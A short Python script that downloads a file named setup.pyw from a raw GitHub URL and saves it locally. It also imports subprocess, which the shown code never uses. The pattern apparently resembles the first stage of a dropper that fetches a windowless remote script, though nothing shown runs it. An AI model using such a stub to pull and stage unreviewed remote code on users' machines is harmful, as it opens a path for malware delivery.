import os
import sys
import subprocess
import requests

URL = "https://raw.githubusercontent.com/lamer34/lamer_code/master/setup.pyw"

r = requests.get(URL)
file_name = URL.split("/")[-1]

if r.ok:
    with open(f"{file_name}", "w") as w:
        w.write(r.text)
